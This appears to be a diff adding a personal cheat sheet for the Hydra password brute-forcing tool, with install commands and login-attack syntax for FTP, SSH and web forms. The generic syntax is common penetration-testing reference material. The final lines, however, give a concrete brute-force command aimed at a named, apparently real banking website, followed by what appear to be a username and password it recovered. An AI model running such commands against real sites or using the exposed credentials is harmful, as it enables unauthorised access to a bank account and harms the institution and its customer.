@@ -1,0 +1,13 @@
+- Official documentation : https://en.kali.tools/?p=220
+- Hydra youtube video of THM : https://www.youtube.com/watch?v=8fs_7bm88GY&t=3s
+- Installation : 
+    - ubuntu : apt install hydra
+    - fedora : dng install hydra
+- Syntax : 
+    - ftp : hydra -l [USERNAME] -P [WORDLIST] ftp://[IP_ADDRESS]
+    - ssh : hydra -l [USERNAME] -P [WORDLIST] [IP_ADDRESS] -t [NUMBER_OF_THREAD:1-5] ssh
+    - http-form : hydra -l [USERNAME] -P [WORDLIST] [IP_ADDRESS] http-<post/get>-form "/login:username=^USER^&password=^PASS^:F=[PART_OF_ERROR_MESSAGE]" -V
+    hydra -L /home/kali/wordlist_numbers.txt -P /home/kali/wordlist_numbers.txt www.sipembanque.mg https-post-form "/sipemnet:username=^USER^&mdp=^PASS^:F='incorrect ou compte désactivé'" -V
+
+    username=145405
+mdp=973562
